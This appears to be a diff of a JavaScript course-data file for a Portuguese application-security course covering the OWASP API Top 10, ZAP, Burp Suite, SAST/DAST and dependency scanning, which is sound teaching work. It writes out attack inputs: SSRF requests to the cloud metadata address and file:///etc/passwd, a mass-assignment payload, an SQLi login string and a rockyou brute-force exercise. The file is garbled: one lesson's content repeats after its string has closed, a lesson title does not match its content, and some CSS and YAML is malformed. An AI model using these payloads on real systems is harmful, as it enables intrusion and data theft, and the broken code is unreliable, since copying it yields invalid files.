-        { id: "sec3-l2", title: "Headers de segurança", duration: "35 min", content: "<p>API Security — rate limiting, input validation, OWASP API Top 10. Testes de contrato, fuzzing, authZ, mass assignment, broken object property level auth.</p><h3>OWASP API Security Top 10 2023</h3><ol><li><strong>API1: Broken Object Level Authorization (BOLA)</strong> — IDOR em endpoints: <code>GET /api/users/123/orders</code> acessa orders de outro user</li><li><strong>API2: Broken Authentication</strong> — token fraco, JWT issues, credential stuffing, missing rate limit</li><li><strong>API3: Broken Object Property Level Authorization</strong> — mass assignment: <code>PATCH /api/users/me { "role": "admin" }</code></li><li><strong>API4: Unrestricted Resource Consumption</strong> — sem rate limit, pagination sem limite, large payloads, DoS via API</li><li><strong>API5: Broken Function Level Authorization</strong> — user acessa admin endpoints: <code>DELETE /api/admin/users</code></li><li><strong>API6: Unrestricted Access to Sensitive Business Flows</strong> — compra sem pagamento, reserva sem validação, business logic bypass</li><li><strong>API7: Server Side Request Forgery (SSRF)</strong> — <code>POST /api/fetch { "url": "http://169.254.169.254/latest/meta-data/" }</code></li><li><strong>API8: Security Misconfiguration</strong> — debug endpoints, verbose errors, CORS wildcard, missing headers, versioned APIs deprecated</li><li><strong>API9: Improper Inventory Management</strong> — APIs shadow/zombie, documentação desatualizada, versioning confuso</li><li><strong>API10: Unsafe Consumption of APIs</strong> — confia cegamente em APIs terceiras, sem validação, timeout, circuit breaker</li></ol><h3>Testes essenciais para APIs</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Teste</th><th style="padding:0.5rem;border:1px solid var(--border)">Como testar</th><th style="padding:0.5rem:border:1px solid var(--border)">Ferramentas</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>BOLA/IDOR</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Crie 2 users. User A acessa recurso do User B mudando ID na URL. Teste: GET, PUT, DELETE.</td><td style="padding:0.5rem;border:1px solid var(--border)">Burp, custom script, Postman</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Mass Assignment</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">PATCH com campos extras: <code>{"email":"a@b.com","isAdmin":true,"balance":999999}</code>. Verifique se persistiu.</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp Repeater, custom</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Rate Limiting</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Envie 100 req/s. Verifique: 429 response? Headers <code>X-RateLimit-*</code>? Quota por user/IP?</td><td style="padding:0.5rem:border:1px solid var(--border)">hey, vegeta, k6, custom</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Input Validation</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Fuzzing: SQLi, XSS, command injection, XXE, path traversal em todos params (query, body, headers).</td><td style="padding:0.5rem:border:1px solid var(--border)">nuclei, ffuf, custom wordlists</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>AuthZ (RBAC/ABAC)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Teste matrix: role × endpoint × method. Admin-only, owner-only, public. Verifique 403 vs 404.</td><td style="padding:0.5rem:border:1px solid var(--border)">custom script, Postman collection</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Contract Testing</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Schema validation (JSON Schema/Zod), Pact consumer-driven contracts. Breaking changes detection.</td><td style="padding:0.5rem:border:1px solid var(--border)">Pact, AJV, Zod, Schemathesis</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>SSRF</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Endpoints que fazem fetch: teste <code>http://169.254.169.254</code> (AWS metadata), <code>http://localhost:22</code>, <code>file:///etc/passwd</code>.</td><td style="padding:0.5rem:border:1px solid var(--border)">Burp, custom, ssrfmap</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>GraphQL</strong></td><td style="padding:0.5rem:border:1px solid var(--border)">Introspection enabled? Depth limiting? Cost analysis? Batch attacks? Field-level auth?</td><td style="padding:0.5rem:border:1px solid var(--border)">GraphQL Voyager, InQL, custom</td></tr></table><h3>Ferramentas para API Security Testing</h3><ul><li><strong>Postman/Newman:</strong> collections automatizadas, test scripts, CI/CD</li><li><strong>Schemathesis:</strong> property-based testing contra OpenAPI spec</li><li><strong>Pact:</strong> consumer-driven contract testing</li><li><strong>nuclei templates:</strong> <code>nuclei -t api/ -t cves/</code></li><li><strong>k6 + custom checks:</strong> validação de schema, authZ, rate limit em load test</li><li><strong>OWASP API Security Project:</strong> checklist, test guides</li></ul><h3>Exercício prático</h3><ol><li>Use <a href="https://github.com/OWASP/API-Security" target="_blank">OWASP API Security Demo</a> ou crie API simples com FastAPI/Express</li><li>Implemente 3 vulnerabilidades: BOLA, Mass Assignment, No Rate Limit</li><li>Escreva testes (Postman/k6/Pact) que detectam cada uma</li><li>Corrija: adiciona authZ checks, allowlist fields, rate limiter</li><li>Re-teste → todos passam</li></ol>, resources: [{ label: "Security Headers", url: "https://securityheaders.com/" }] }
-      ]},
-      { id: "sec4", title: "Ferramentas", lessons: [
-        { id: "sec4-l1", title: "OWASP ZAP — proxy e scan", duration: "50 min", content: "<p>Configure ZAP como proxy, navegue na app, rode Active Scan e analise alertas. Integre ZAP baseline scan na CI.
-</p><h3>OWASP ZAP — ferramenta completa e gratuita</h3><p>ZAP (Zed Attack Proxy) é o scanner DAST mais popular open source. Funciona como proxy interceptador + scanner ativo + fuzzer + API para CI/CD.
-</p><h3>Modos de uso</h3><ol><li><strong>Proxy Manual:</strong> configure browser → ZAP → app. Navegue, ZAP mapeia a app.</li><li><strong>Spider / Ajax Spider:</strong> crawleia a app automaticamente (SPA-friendly).</li><li><strong>Active Scan:</strong> ataca endpoints descobertos com payloads (SQLi, XSS, etc.).</li><li><strong>Baseline Scan (CI/CD):</strong> scan rápido, passivo + leve ativo, falha o build se alertas > threshold.</li></ol><h3>Setup rápido (Docker)</h3><pre><code># Baseline scan headless (ideal para CI)
-docker run -t owasp/zap2docker-stable zap-baseline.py   -t https://staging.seuapp.com   -r zap-report.html   -J zap-report.json   -I  # falha se alertas HIGH/MEDIUM
-
-# Com autenticação (contexto)
-docker run -t owasp/zap2docker-stable zap-baseline.py   -t https://staging.app.com   -c zap-context.context   -u "username:password"   -r zap-report.html</code></pre><h3>ZAP Context — autenticação para scan autenticado</h3><pre><code># 1. No ZAP GUI: Contexts → New Context → nome "MeuApp"
-# 2. Include in Context: regex da app (https://app.com/.*)
-# 3. Authentication → Form-based → configure login URL, username/password fields
-# 4. Users → Add user "testuser" → credenciais
-# 5. Forced User → enable "testuser"
-# 6. Export Context: File → Export Context → meuapp.context
-
-# 7. Use no baseline:
-docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable   zap-baseline.py -t https://staging.app.com -c meuapp.context -r report.html</code></pre><h3>Interpretando alertas</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Risk</th><th style="padding:0.5rem;border:1px solid var(--border)">Confidence</th><th style="padding:0.5rem;border:1px solid var(--border)">Ação</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>High</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Confirmada</td><td style="padding:0.5rem;border:1px solid var(--border)">🚨 BLOQUEAR release. Investigar IMEDIATAMENTE.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Medium</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Confirmada</td><td style="padding:0.5rem;border:1px solid var(--border)">⚠️ Investigar antes do release. Criar ticket.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Low</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Qualquer</td><td style="padding:0.5rem;border:1px solid var(--border)">📝 Backlog. Melhoria contínua.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Informational</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">-</td><td style="padding:0.5rem;border:1px solid var(--border)">ℹ️ Ignorar ou documentar.</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Qualquer</strong></td><td style="padding:0.5rem;border:1px solid var(--border)"><strong>False Positive</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">✅ Marcar como FP no ZAP, não bloquear.</td></tr></table><h3>Integração GitHub Actions</h3><pre><code># .github/workflows/zap-scan.yml
-name: ZAP Baseline Scan
-
-on:
-  pull_request:
-    branches: [main]
-  schedule:
-    - cron: '0 2 * * 1'  # weekly Monday 2AM
-
-jobs:
-  zap_scan:
-  runs-on: ubuntu-latest
-  name: ZAP Baseline Scan
-  steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-    
-    - name: ZAP Scan
-      uses: zaproxy/action-baseline@v0.10.0
-      with:
-        target: 'https://staging.seuapp.com'
-        fail_action: true  # falha se HIGH/MEDIUM
-        cmd_options: '-a'  # active scan leve
-    
-    - name: Upload ZAP Report
-      uses: actions/upload-artifact@v4
-      if: always()
-      with:
-        name: zap-report
-        path: report_html.html
-        retention-days: 30</code></pre><h3>Exercício prático</h3><ol><li>Instale Docker e rode: <code>docker run -t owasp/zap2docker-stable zap-baseline.py -t https://juice-shop.herokuapp.com -r report.html</code></li><li>Abra <code>report.html</code> — analise alertas High/Medium</li><li>Crie contexto de autenticação para Juice Shop (login: user@juice-sh.op / 12345)</li><li>Rode scan autenticado e compare resultados</li><li>Adicione workflow no seu repo</li></ol>", resources: [{ label: "OWASP ZAP", url: "https://www.zaproxy.org/" }] },
-        { id: "sec4-l2", title: "Burp Suite Community (intro)", duration: "40 min", content: "<p>Intercept, Repeater, Intruder básico. Complementa testes manuais de segurança em APIs e forms.
-</p><h3>Burp Suite Community — ferramenta essencial para AppSec manual</h3><p>Burp é o padrão da indústria para testes manuais. Community edition é gratuita e poderosa para interceptação, repetição e fuzzing básico.
-</p><h3>Setup rápido</h3><ol><li>Download: <a href="https://portswigger.net/burp/releases/community" target="_blank">portswigger.net/burp</a></li><li>Instale certificado CA do Burp no browser/OS (para HTTPS)</li><li>Configure proxy: 127.0.0.1:8080</li><li>Browser: FoxyProxy ou configuração nativa → proxy Burp</li></ol><h3>Abas essenciais</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Aba</th><th style="padding:0.5rem;border:1px solid var(--border)">Para que serve</th><th style="padding:0.5rem;border:1px solid var(--border)">Quando usar</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Proxy → Intercept</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Intercepta requests/responses em tempo real, edita antes de forward</td><td style="padding:0.5rem;border:1px solid var(--border)">Testar bypass de validação client-side, modificar headers, injectar payloads</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Proxy → HTTP History</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Log de todo tráfego passado pelo proxy</td><td style="padding:0.5rem;border:1px solid var(--border)">Revisar requests, encontrar endpoints ocultos, analisar cookies/headers</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Repeater</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Reenvia request quantas vezes quiser, modificando cada vez</td><td style="padding:0.5rem;border:1px solid var(--border)">Testar SQLi, XSS, IDOR, auth bypass, race conditions — manual, controlado</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Intruder</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Automatiza envio de payloads em posições marcadas (fuzzing)</td><td style="padding:0.5rem;border:1px solid var(--border)">Brute force, enumeração, fuzzing de parâmetros, credential stuffing</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Decoder</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Encode/decode: URL, HTML, Base64, JWT, hash, etc.</td><td style="padding:0.5rem;border:1px solid var(--border)">Analisar tokens, payloads ofuscados, cookies codificados</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Comparer</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Diff visual entre dois requests/responses</td><td style="padding:0.5rem;border:1px solid var(--border)">Identificar diferenças sutis em responses (sucesso vs erro)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Sequencer</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Analisa entropia/randomness de tokens (session, CSRF, reset)</td><td style="padding:0.5rem;border:1px solid var(--border)">Validar qualidade de tokens de sessão, reset password, API keys</td></tr></table><h3>Fluxo de trabalho típico</h3><ol><li><strong>Mapeamento:</strong> Navegue na app com Intercept OFF, History ON</li><li><strong>Análise:</strong> HTTP History → filtre por URL, método, status. Identifique endpoints sensíveis.</li><li><strong>Teste manual:</strong> Botão direito no request → Send to Repeater. Modifique, reenvie, analise.</li><li><strong>Fuzzing:</strong> Send to Intruder → marque posições (§payload§) → Payloads → Load wordlist → Start attack.</li><li><strong>Documentação:</strong> Copy to file / Export selected → evidencia para relatório.</li></ol><h3>Dicas de ouro</h3><ul><li><strong>Scope:</strong> Target → Scope → adicione URL alvo → "Show only in-scope" → reduz ruído</li><li><strong>Match and Replace:</strong> Proxy → Options → Match and Replace → adicione header <code>X-Forwarded-For: 127.0.0.1</code> ou remova headers de segurança para testar</li><li><strong>Session Handling Rules:</strong> Project options → Sessions → macro handling para tokens que expiram</li><li><strong>Extensões (BApp Store):</strong> Autorize (auth testing), Turbo Intruder (high-speed), Logger++ (better logs), JSON Beautifier</li></ul><h3>Exercício prático</h3><ol><li>Configure Burp + FoxyProxy no Firefox</li><li>Acesse <a href="https://juice-shop.herokuapp.com" target="_blank">OWASP Juice Shop</a> via Burp</li><li>No HTTP History, encontre o endpoint de login</li><li>Send to Repeater → teste SQLi no email: <code>' OR '1'='1</code></li><li>Send to Intruder → marque posição do password → Payloads: rockyou.txt (top 100) → Start attack</li><li>Analise resultados: status codes diferentes, response lengths diferentes</li></ol>", resources: [{ label: "Burp Suite", url: "https://portswigger.net/burp/communitydownload" }] }
-      ]},
-      { id: "sec5", title: "Security na Pipeline", lessons: [
-        { id: "sec5-l1", title: "SAST e DAST (intro)", duration: "40 min", content: "<p>SAST analisa código estático; DAST testa app rodando. Ferramentas: Semgrep, SonarQube, ZAP baseline. QA define quando bloquear merge.
-</p><h3>SAST vs DAST — quando usar cada um</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Aspecto</th><th style="padding:0.5rem;border:1px solid var(--border)">SAST (Static Application Security Testing)</th><th style="padding:0.5rem;border:1px solid var(--border)">DAST (Dynamic Application Security Testing)</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>O que analisa</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Código fonte / bytecode / binário (parado)</td><td style="padding:0.5rem;border:1px solid var(--border)">Aplicação rodando (runtime)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Quando roda</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">CI/CD (pre-commit, PR, build), IDE</td><td style="padding:0.5rem;border:1px solid var(--border)">Staging/Prod-like env, scheduled, PR deploy</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>O que encontra</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Hardcoded secrets, SQLi patterns, XSS sinks, crypto fraco, dependencies vuln</td><td style="padding:0.5rem;border:1px solid var(--border)">XSS real, SQLi real, auth bypass, IDOR, config errors, business logic</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>False positives</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Alto (não sabe contexto runtime)</td><td style="padding:0.5rem;border:1px solid var(--border)">Baixo (testa de verdade)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Cobertura</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">100% do código (se configurado)</td><td style="padding:0.5rem;border:1px solid var(--border)">Apenas caminhos exercitados</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Tempo</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Segundos a minutos</td><td style="padding:0.5rem;border:1px solid var(--border)">Minutos a horas</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Exemplos</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Semgrep, SonarQube, CodeQL, Checkmarx, Fortify</td><td style="padding:0.5rem;border:1px solid var(--border)">OWASP ZAP, Burp Scanner, Acunetix, Nuclei</td></tr></table><h3>Ferramentas SAST recomendadas (gratuitas/open source)</h3><ul><li><strong>Semgrep:</strong> <code>semgrep --config=auto .</code> — regras YAML, 2000+ rules, suporta 20+ linguagens, CI-friendly, <strong>rápido</strong></li><li><strong>SonarQube / SonarCloud:</strong> qualidade de código + security rules, dashboard histórico, quality gates</li><li><strong>CodeQL (GitHub):</strong> query language poderosa, grátis para open source, integra no GHAS</li><li><strong>Trivy / Grype:</strong> container/image scanning + config (IaC) scanning</li></ul><h3>Pipeline recomendado</h3><pre><code># .github/workflows/security.yml
-name: Security Scan
-
-on: [pull_request, push]
-
-jobs:
-  sast:
-    name: SAST (Semgrep)
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Run Semgrep
-        uses: returntocorp/semgrep-action@v1
-        with:
-          config: auto
-          generate-sarif: true
-      - name: Upload SARIF
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: semgrep.sarif
-  
-  dast:
-    name: DAST (ZAP Baseline)
-    runs-on: ubuntu-latest
-    if: github.event_name == 'pull_request'  # só em PR para staging
-    steps:
-      - uses: actions/checkout@v4
-      - name: ZAP Baseline Scan
-        uses: zaproxy/action-baseline@v0.10.0
-        with:
-          target: 'https://staging.seuapp.com'
-          fail_action: true
-          cmd_options: '-a'  # active scan leve
-  
-  secrets:
-    name: Secret Detection
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - name: TruffleHog
-        uses: trufflesecurity/trufflehog@v3
-        with:
-          path: ./
-          base: main
-          head: HEAD</code></pre><h3>Quality Gates — quando bloquear merge</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Gate</th><th style="padding:0.5rem;border:1px solid var(--border)">SAST</th><th style="padding:0.5rem;border:1px solid var(--border)">DAST</th><th style="padding:0.5rem;border:1px solid var(--border)">Secrets</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Bloquear PR (fail)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">High/Critical findings novos (baseline diff)</td><td style="padding:0.5rem;border:1px solid var(--border)">High findings (ZAP baseline)</td><td style="padding:0.5rem;border:1px solid var(--border)">Qualquer secret válido detectado</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Warning (não bloqueia)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Medium findings, novos</td><td style="padding:0.5rem;border:1px solid var(--border)">Medium findings</td><td style="padding:0.5rem;border:1px solid var(--border)">Potential secret (entropy alto)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Info</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Low, informational</td><td style="padding:0.5rem;border:1px solid var(--border)">Low, informational</td><td style="padding:0.5rem;border:1px solid var(--border)">-</td></tr></table><h3>Exercício prático</h3><ol><li>Adicione <code>semgrep --config=auto .</code> no CI do seu projeto</li><li>Rode local: <code>semgrep --config=auto . --json=semgrep.json</code></li><li>Analise findings: quais são true positive? Quais false positive?</li><li>Configure baseline: <code>semgrep --config=auto . --baseline=semgrep-baseline.json</code></li><li>Adicione ZAP baseline scan no CI (use staging deploy preview)</li></ol>", resources: [] },
-        { id: "sec5-l2", title: "Dependency scanning", duration: "35 min", content: "<p>npm audit, Snyk, Dependabot. Vulnerabilidades em libs terceiras são vetor comum (OWASP A06).
-</p><h3>Supply Chain Security — dependências são seu código</h3><p>80-90% do código em apps modernas vem de dependências. Uma vuln no <code>lodash</code> ou <code>log4j</code> afeta você. Automatize detecção e remediação.
-</p><h3>Ferramentas por ecossistema</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Ferramenta</th><th style="padding:0.5rem;border:1px solid var(--border)">Ecosystem</th><th style="padding:0.5rem;border:1px solid var(--border)">Grátis para</th><th style="padding:0.5rem;border:1px solid var(--border)">Features chave</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>npm audit</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Node.js</td><td style="padding:0.5rem;border:1px solid var(--border)">Sempre (built-in)</td><td style="padding:0.5rem;border:1px solid var(--border)">Built-in, <code>npm audit fix</code>, CI exit code</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Yarn audit</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Node.js</td><td style="padding:0.5rem;border:1px solid var(--border)">Sempre</td><td style="padding:0.5rem;border:1px solid var(--border)">Similar ao npm, melhor performance</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Snyk</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Multi (JS, Python, Java, Go, .NET, containers, IaC)</td><td style="padding:0.5rem;border:1px solid var(--border)">Open source, 200 tests/mês free</td><td style="padding:0.5rem;border:1px solid var(--border)">PRs automáticos fix, license scanning, container/IaC</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Dependabot (GitHub)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Multi (npm, pip, maven, gradle, cargo, compose, actions)</td><td style="padding:0.5rem;border:1px solid var(--border)">Sempre (GitHub free)</td><td style="padding:0.5rem;border:1px solid var(--border)">PRs automáticos, version updates, security alerts</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Renovate</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Multi (tudo que Dependabot + mais)</td><td style="padding:0.5rem;border:1px solid var(--border)">Open source, self-hosted</td><td style="padding:0.5rem;border:1px solid var(--border)">Monorepo, group updates, custom schedules, auto-merge</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>OWASP Dependency-Check</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Java, .NET, JS, Python, Ruby, C/C++</td><td style="padding:0.5rem;border:1px solid var(--border)">Sempre (CLI, Maven, Gradle, Jenkins)</td><td style="padding:0.5rem;border:1px solid var(--border)">NVD/CVE database, HTML/JSON reports, CI plugins</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Trivy / Grype</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Containers, FS, Git repos, SBOM</td><td style="padding:0.5rem;border:1px solid var(--border)">Sempre</td><td style="padding:0.5rem;border:1px solid var(--border)">Container scanning, SBOM generation, misconfig detection</td></tr></table><h3>Configuração recomendada — GitHub Dependabot</h3><pre><code># .github/dependabot.yml
-version: 2
-updates:
-  # npm dependencies
-  - package-ecosystem: "npm"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-      day: "monday"
-      time: "09:00"
-    open-pull-requests-limit: 10
-    reviewers: ["security-team"]
-    assignees: ["lead-dev"]
-    labels: ["dependencies", "npm"]
-    commit-message:
-      prefix: "chore(deps)"
-    # Auto-merge para patch/minor se CI passa
-    allow:
-      - dependency-type: "direct"
-      - dependency-type: "indirect"
-    ignore:
-      - dependency-name: "@types/*"
-        update-types: ["version-update:semver-major"]
-
-  # GitHub Actions
-  - package-ecosystem: "github-actions"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    labels: ["dependencies", "github-actions"]
-
-  # Docker
-  - package-ecosystem: "docker"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    labels: ["dependencies", "docker"]</code></pre><h3>Snyk — PRs automáticos com fix</h3><pre><code># 1. Conecte repo no snyk.io (grátis para open source)
-# 2. Snyk cria PRs automáticos quando vuln detectada
-# 3. PR inclui: changelog, breaking changes, test results
-
-# CLI para CI local
-npm install -g snyk
-snyk auth
-snyk test --severity-threshold=high
-snyk monitor  # snapshot no dashboard</code></pre><h3>Container scanning — Trivy</h3><pre><code># Scan local
-trivy image sua-app:latest
-trivy fs --security-checks vuln,config,secret .
-
-# CI/CD
-- name: Trivy Scan
-  uses: aquasecurity/trivy-action@master
-  with:
-    scan-type: 'fs'
-    scan-ref: '.'
-    format: 'sarif'
-    output: 'trivy.sarif'
-    severity: 'CRITICAL,HIGH'
-
-- name: Upload Trivy SARIF
-  uses: github/codeql-action/upload-sarif@v3
-  with:
-    sarif_file: 'trivy.sarif'</code></pre><h3>SBOM (Software Bill of Materials)</h3><pre><code># Gerar SBOM (formato SPDX ou CycloneDX)
-syft packages sua-app:latest -o spdx-json=sbom.spdx.json
-syft packages dir:. -o cyclonedx-json=bom.json
-
-# Verificar se vuln conhecida está no SBOM
-grype sbom:sbom.spdx.json</code></pre><h3>Exercício prático</h3><ol><li>Ative Dependabot no seu repo: crie <code>.github/dependabot.yml</code></li><li>Conecte Snyk no repo (grátis para open source)</li><li>Rode <code>trivy image sua-imagem:tag</code> local</li><li>Analise PRs abertos: quais são breaking changes? Quais são apenas patch?</li><li>Configure auto-merge para dependabot PRs que passam CI (patch/minor)</li></ol>", "npm"]
-    commit-message:
-      prefix: "chore(deps)"
-    # Auto-merge para patch/minor se CI passa
-    allow:
-      - dependency-type: "direct"
-      - dependency-type: "indirect"
-    ignore:
-      - dependency-name: "@types/*"
-        update-types: ["version-update:semver-major"]
-
-  # GitHub Actions
-  - package-ecosystem: "github-actions"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    labels: ["dependencies", "github-actions"]
-
-  # Docker
-  - package-ecosystem: "docker"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    labels: ["dependencies", "docker"]</code></pre><h3>Snyk — PRs automáticos com fix</h3><pre><code># 1. Conecte repo no snyk.io (grátis para open source)
-# 2. Snyk cria PRs automáticos quando vuln detectada
-# 3. PR inclui: changelog, breaking changes, test results
-
-# CLI para CI local
-npm install -g snyk
-snyk auth
-snyk test --severity-threshold=high
-snyk monitor  # snapshot no dashboard</code></pre><h3>Container scanning — Trivy</h3><pre><code># Scan local
-trivy image sua-app:latest
-trivy fs --security-checks vuln,config,secret .
-
-# CI/CD
-- name: Trivy Scan
-  uses: aquasecurity/trivy-action@master
-  with:
-    scan-type: 'fs'
-    scan-ref: '.'
-    format: 'sarif'
-    output: 'trivy.sarif'
-    severity: 'CRITICAL,HIGH'
-
-- name: Upload Trivy SARIF
-  uses: github/codeql-action/upload-sarif@v3
-  with:
-    sarif_file: 'trivy.sarif'</code></pre><h3>SBOM (Software Bill of Materials)</h3><pre><code># Gerar SBOM (formato SPDX ou CycloneDX)
-syft packages sua-app:latest -o spdx-json=sbom.spdx.json
-syft packages dir:. -o cyclonedx-json=bom.json
-
-# Verificar se vuln conhecida está no SBOM
-grype sbom:sbom.spdx.json</code></pre><h3>Exercício prático</h3><ol><li>Ative Dependabot no seu repo: crie <code>.github/dependabot.yml</code></li><li>Conecte Snyk no repo (grátis para open source)</li><li>Rode <code>trivy image sua-imagem:tag</code> local</li><li>Analise PRs abertos: quais são breaking changes? Quais são apenas patch?</li><li>Configure auto-merge para dependabot PRs que passam CI (patch/minor)</li></ol>", resources: [] }
-      ]},
-      { id: "sec6", title: "Projeto Final — Security", lessons: [
-        { id: "sec6-l1", title: "Auditoria em app de prática", duration: "120 min", content: "<p>Escolha DVWA ou Juice Shop. Documente 5 vulnerabilidades encontradas, severidade, passos, evidências e recomendações de fix.
-</p><h3>Projeto final — Security Testing Portfolio</h3><p>Este projeto consolida toda a trilha de Security. Você vai executar testes de segurança completos em uma app vulnerável intencional, documentar achados profissionalmente e entregar um relatório executivo + técnico — o tipo de artefato que diferencia um QA Security no mercado.
-</p><h3>Aplicações alvo (escolha uma)</h3><ol><li><strong>DVWA (Damn Vulnerable Web App):</strong> PHP/MySQL, níveis de dificuldade, foco em OWASP Top 10 clássico. Docker: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code></li><li><strong>OWASP Juice Shop:</strong> Node.js/Angular, moderna, SPA, inclui desafios de scoring, CTF. Docker: <code>docker run -d -p 3000:3000 bkimminich/juice-shop</code></li><li><strong>bWAPP:</strong> PHP, 100+ vulns, bee-box VM disponível</li><li><strong>WebGoat:</strong> Java, focado em ensino, lições guiadas</li></ol><h3>Escopo obrigatório — mínimo 5 vulnerabilidades</h3><p>Cubra pelo menos 3 categorias OWASP Top 10 diferentes:</p><ul><li>Injection (SQLi, NoSQLi, Command Injection)</li><li>Broken Access Control (IDOR, path traversal, missing auth)</li><li>XSS (Reflected, Stored, DOM)</li><li>Authentication/Session (brute force, fixation, JWT)</li><li>Security Misconfiguration (headers, debug, defaults)</li><li>Sensitive Data Exposure (PII em logs, cookies inseguros, crypto fraco)</li><li>Vulnerable Components (package com CVE conhecido)</li></ul><h3>Entregáveis</h3><h4>1. Relatório Executivo (1 página — para gestão)</h4><pre><code># Security Assessment Report — [App Name]
-
-## Resumo Executivo
-- **Aplicação:** [Nome + versão + URL]
-- **Período:** [Datas]
-- **Escopo:** [URLs, funcionalidades testadas]
-- **Metodologia:** OWASP Testing Guide v4, OWASP Top 10 2021
